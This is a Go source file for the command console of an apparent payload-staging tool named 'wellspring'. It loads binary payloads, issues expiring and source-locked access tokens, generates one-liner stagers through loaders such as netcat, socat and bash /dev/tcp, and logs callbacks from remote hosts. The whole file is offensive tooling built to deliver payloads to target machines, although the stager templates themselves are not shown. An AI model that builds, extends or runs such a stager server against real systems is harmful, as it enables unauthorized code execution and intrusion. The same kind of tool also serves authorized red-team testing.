package cli

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
	"wellspring/internal/callback"
	"wellspring/internal/loader"
	"wellspring/internal/payload"
)

type Console struct {
	manager *payload.PayloadManager
	tracker *callback.Tracker
	host    string
	port    string
	rawPort string
}

func NewConsole(manager *payload.PayloadManager, tracker *callback.Tracker, host, port, rawPort string) *Console {
	return &Console{
		manager: manager,
		tracker: tracker,
		host:    host,
		port:    port,
		rawPort: rawPort,
	}
}

func (c *Console) Run() {
	PrintBanner()
	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Printf("%s%swellspring%s > ", Bold, Mauve, Reset)
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		args := strings.Fields(line)
		cmd := args[0]

		switch cmd {
		case "payload":
			c.handlePayload(args[1:])
		case "generate":
			c.handleGenerate(args[1:])
		case "loaders":
			c.handleLoaders()
		case "tokens":
			c.handleTokens()
		case "token":
			c.handleToken(args[1:])
		case "callbacks":
			c.handleCallbacks()
		case "help":
			c.handleHelp()
		case "exit", "quit":
			fmt.Printf("\n%s[*] Zeroing all payloads and shutting down...%s\n", Yellow, Reset)
			c.manager.ZeroAll()
			os.Exit(0)
		default:
			fmt.Printf("%s[!] Unknown command: %s (type 'help' for usage)%s\n", Red, cmd, Reset)
		}
	}
}

func (c *Console) handlePayload(args []string) {
	if len(args) == 0 {
		fmt.Printf("%s[!] Usage: payload <add|list|remove>%s\n", Red, Reset)
		return
	}

	switch args[0] {
	case "add":
		if len(args) < 2 {
			fmt.Printf("%s[!] Usage: payload add <path> [--name NAME]%s\n", Red, Reset)
			return
		}
		path := args[1]
		name := ""
		for i := 2; i < len(args)-1; i++ {
			if args[i] == "--name" {
				name = args[i+1]
			}
		}
		p, err := c.manager.Add(path, name)
		if err != nil {
			fmt.Printf("%s[!] Failed to load %s: %s%s\n", Red, filepath.Base(path), err, Reset)
			return
		}
		fmt.Printf("%s[+] Loaded %s%s%s (%s/%s, %s, encrypted at rest)%s\n",
			Green, Bold, p.ID, Reset+Green, p.Arch.OS, p.Arch.Arch, formatSize(p.Size), Reset)

	case "list":
		payloads := c.manager.List()
		if len(payloads) == 0 {
			fmt.Printf("%s[*] No payloads loaded%s\n", Subtext, Reset)
			return
		}
		fmt.Printf("\n%s  %-6s %-20s %-12s %-10s%s\n", Bold, "ID", "NAME", "OS/ARCH", "SIZE", Reset)
		fmt.Printf("%s  %-6s %-20s %-12s %-10s%s\n", Surface, "──", "────", "───────", "────", Reset)
		for _, p := range payloads {
			fmt.Printf("  %s%-6s%s %-20s %-12s %-10s\n",
				Teal, p.ID, Reset, p.Name, p.Arch.OS+"/"+p.Arch.Arch, formatSize(p.Size))
		}
		fmt.Println()

	case "remove":
		if len(args) < 2 {
			fmt.Printf("%s[!] Usage: payload remove <id>%s\n", Red, Reset)
			return
		}
		if c.manager.Remove(args[1]) {
			fmt.Printf("%s[+] Removed and zeroed %s%s\n", Green, args[1], Reset)
		} else {
			fmt.Printf("%s[!] Payload %s not found%s\n", Red, args[1], Reset)
		}

	default:
		fmt.Printf("%s[!] Usage: payload <add|list|remove>%s\n", Red, Reset)
	}
}

func (c *Console) handleGenerate(args []string) {
	if len(args) < 2 {
		fmt.Printf("%s[!] Usage: generate <payload-id> <loader|all> [flags]%s\n", Red, Reset)
		return
	}

	payloadID := args[0]
	loaderName := args[1]

	p, ok := c.manager.Get(payloadID)
	if !ok {
		fmt.Printf("%s[!] Payload %s not found%s\n", Red, payloadID, Reset)
		return
	}

	host := c.host
	port := c.port
	ttl := time.Hour
	maxUses := 1
	sourceLock := ""

	for i := 2; i < len(args); i++ {
		switch args[i] {
		case "--host":
			if i+1 < len(args) {
				host = args[i+1]
				i++
			}
		case "--port":
			if i+1 < len(args) {
				port = args[i+1]
				i++
			}
		case "--ttl":
			if i+1 < len(args) {
				if d, err := time.ParseDuration(args[i+1]); err == nil {
					ttl = d
				}
				i++
			}
		case "--single-use":
			maxUses = 1
		case "--max-uses":
			if i+1 < len(args) {
				if n, err := strconv.Atoi(args[i+1]); err == nil && n >= 1 {
					maxUses = n
				}
				i++
			}
		case "--source-lock":
			if i+1 < len(args) {
				sourceLock = args[i+1]
				i++
			}
		}
	}

	if loaderName == "all" {
		c.generateAll(payloadID, p, host, port, ttl, maxUses, sourceLock)
		return
	}

	l, ok := loader.Get(loaderName)
	if !ok {
		fmt.Printf("%s[!] Unknown loader: %s (type 'loaders' to list)%s\n", Red, loaderName, Reset)
		return
	}

	tok, err := c.manager.Tokens.Generate(payloadID, ttl, maxUses, sourceLock)
	if err != nil {
		fmt.Printf("%s[!] Token error: %s%s\n", Red, err, Reset)
		return
	}

	opts := loader.StagerOpts{
		Host:       host,
		Port:       c.selectPort(l, port),
		Token:      tok.Value,
		PayloadID:  payloadID,
		TargetOS:   p.Arch.OS,
		TargetArch: p.Arch.Arch,
		TLS:        true,
	}

	stager, err := l.Generate(opts)
	if err != nil {
		fmt.Printf("%s[!] %s%s\n", Red, err, Reset)
		return
	}

	fmt.Printf("\n%s[+] Token: %s%s (TTL: %s, Uses: %d)%s\n",
		Green, displayToken(tok.Value), Reset+Green, ttl, maxUses, Reset)
	if sourceLock != "" {
		fmt.Printf("%s[+] Source lock: %s%s\n", Green, sourceLock, Reset)
	}
	fmt.Printf("\n%s%s%s\n\n", Text, stager, Reset)
}

func (c *Console) generateAll(payloadID string, p *payload.Payload, host, port string, ttl time.Duration, maxUses int, sourceLock string) {
	supported := loader.ListSupported(p.Arch.OS, p.Arch.Arch)
	if len(supported) == 0 {
		fmt.Printf("%s[!] No loaders support %s/%s%s\n", Red, p.Arch.OS, p.Arch.Arch, Reset)
		return
	}
	sort.Slice(supported, func(i, j int) bool { return supported[i].Name() < supported[j].Name() })

	for _, l := range supported {
		tok, err := c.manager.Tokens.Generate(payloadID, ttl, maxUses, sourceLock)
		if err != nil {
			fmt.Printf("%s[!] Token error for %s: %s%s\n", Red, l.Name(), err, Reset)
			continue
		}
		opts := loader.StagerOpts{
			Host:       host,
			Port:       c.selectPort(l, port),
			Token:      tok.Value,
			PayloadID:  payloadID,
			TargetOS:   p.Arch.OS,
			TargetArch: p.Arch.Arch,
			TLS:        true,
		}
		stager, err := l.Generate(opts)
		if err != nil {
			fmt.Printf("%s[!] %s: %s%s\n", Red, l.Name(), err, Reset)
			continue
		}
		fmt.Printf("\n%s%s── %s%s %s(%s)%s\n", Bold, Teal, l.Name(), Reset, Subtext, l.Description(), Reset)
		fmt.Printf("%s%s%s\n", Text, stager, Reset)
	}
	fmt.Println()
}

func (c *Console) selectPort(l loader.Loader, httpPort string) string {
	name := l.Name()
	if strings.HasPrefix(name, "socat") || name == "bash-devtcp" || name == "netcat" {
		return c.rawPort
	}
	return httpPort
}

func (c *Console) handleLoaders() {
	all := loader.List()
	sort.Slice(all, func(i, j int) bool { return all[i].Name() < all[j].Name() })

	fmt.Printf("\n%s  %-18s %-16s %s%s\n", Bold, "LOADER", "REQUIRES", "DESCRIPTION", Reset)
	fmt.Printf("%s  %-18s %-16s %s%s\n", Surface, "──────", "────────", "───────────", Reset)
	for _, l := range all {
		req := l.RequiresTool()
		if req == "" {
			req = "(none)"
		}
		fmt.Printf("  %s%-18s%s %-16s %s\n", Teal, l.Name(), Reset, req, l.Description())
	}
	fmt.Println()
}

func (c *Console) handleTokens() {
	tokens := c.manager.Tokens.List()
	if len(tokens) == 0 {
		fmt.Printf("%s[*] No active tokens%s\n", Subtext, Reset)
		return
	}

	fmt.Printf("\n%s  %-20s %-8s %-8s %-12s %-20s%s\n", Bold, "TOKEN", "PAYLOAD", "USES", "REMAINING", "SOURCE", Reset)
	fmt.Printf("%s  %-20s %-8s %-8s %-12s %-20s%s\n", Surface, "─────", "───────", "────", "─────────", "──────", Reset)
	for _, t := range tokens {
		remaining := time.Until(t.ExpiresAt).Round(time.Second)
		if remaining < 0 {
			remaining = 0
		}
		src := t.SourceLock
		if src == "" {
			src = "*"
		}
		uses := fmt.Sprintf("%d", t.UseCount)
		if t.MaxUses > 0 {
			uses = fmt.Sprintf("%d/%d", t.UseCount, t.MaxUses)
		}
		fmt.Printf("  %s%-20s%s %-8s %-8s %-12s %-20s\n",
			Teal, displayToken(t.Value), Reset, t.PayloadID, uses, remaining, src)
	}
	fmt.Println()
}

func (c *Console) handleToken(args []string) {
	if len(args) < 2 || args[0] != "revoke" {
		fmt.Printf("%s[!] Usage: token revoke <token>%s\n", Red, Reset)
		return
	}
	if c.manager.Tokens.Revoke(args[1]) {
		fmt.Printf("%s[+] Token revoked%s\n", Green, Reset)
	} else {
		fmt.Printf("%s[!] Token not found%s\n", Red, Reset)
	}
}

func (c *Console) handleCallbacks() {
	events := c.tracker.List()
	if len(events) == 0 {
		fmt.Printf("%s[*] No delivery events%s\n", Subtext, Reset)
		return
	}

	fmt.Printf("\n%s  %-20s %-8s %-18s %-16s %-10s %-8s %-6s%s\n",
		Bold, "TIME", "PAYLOAD", "NAME", "SOURCE", "METHOD", "SIZE", "OK", Reset)
	fmt.Printf("%s  %-20s %-8s %-18s %-16s %-10s %-8s %-6s%s\n",
		Surface, "────", "───────", "────", "──────", "──────", "────", "──", Reset)
	for _, e := range events {
		status := Green + "yes" + Reset
		if !e.Success {
			status = Red + "FAIL" + Reset
		}
		fmt.Printf("  %-20s %s%-8s%s %-18s %-16s %-10s %-8s %s\n",
			e.Timestamp.Format("15:04:05"),
			Teal, e.PayloadID, Reset,
			e.PayloadName,
			e.RemoteAddr,
			e.Method,
			formatSize(e.Size),
			status)
	}
	fmt.Println()
}

func (c *Console) handleHelp() {
	fmt.Printf(`
%s%sPayload Management%s
  %spayload add%s <path> [--name N]       Load a binary (auto-detects OS/arch)
  %spayload list%s                         Show loaded payloads
  %spayload remove%s <id>                  Remove and zero memory

%s%sStager Generation%s
  %sgenerate%s <id> <loader> [flags]       Generate one-liner stager
  %sgenerate%s <id> all [flags]            Generate ALL compatible stagers
    --host IP  --port PORT               Server address
    --ttl 1h  --single-use               Token constraints
    --max-uses N  --source-lock CIDR     Access restrictions

%s%sInformation%s
  %sloaders%s                              List delivery methods
  %stokens%s                               List active tokens
  %stoken revoke%s <value>                 Revoke a token
  %scallbacks%s                            Show delivery log

%s%sControl%s
  %sexit%s                                 Shutdown + zero all payloads

`,
		Bold, Teal, Reset,
		Blue, Reset, Blue, Reset, Blue, Reset,
		Bold, Teal, Reset,
		Blue, Reset, Blue, Reset,
		Bold, Teal, Reset,
		Blue, Reset, Blue, Reset, Blue, Reset, Blue, Reset,
		Bold, Teal, Reset,
		Blue, Reset)
}

func displayToken(v string) string {
	if len(v) > 8 {
		return v[:8] + "..."
	}
	return v
}

func formatSize(bytes int64) string {
	switch {
	case bytes >= 1<<20:
		return fmt.Sprintf("%.1fMB", float64(bytes)/float64(1<<20))
	case bytes >= 1<<10:
		return fmt.Sprintf("%.1fKB", float64(bytes)/float64(1<<10))
	default:
		return fmt.Sprintf("%dB", bytes)
	}
}
